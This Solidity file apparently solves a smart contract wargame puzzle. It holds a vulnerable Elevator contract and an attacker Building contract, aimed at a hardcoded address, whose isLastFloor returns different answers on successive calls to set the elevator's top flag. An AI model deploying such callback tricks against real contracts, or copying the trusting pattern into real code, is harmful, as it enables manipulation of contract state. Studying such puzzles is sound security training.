// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Building
{
    uint public top;
    Elevator public asd = Elevator(0x7bE06d3C85cE75Eac0Ed5d4b7E04E97676858AFD);
    uint public i = 0;
    function isLastFloor(uint floor_) external returns (bool)
    {
        if(i==0)
        {
            i++;
            return false;
        }
        else
        {
            return true;
        }
    }

    function start() public
    {
        asd.goTo(10);
    }
}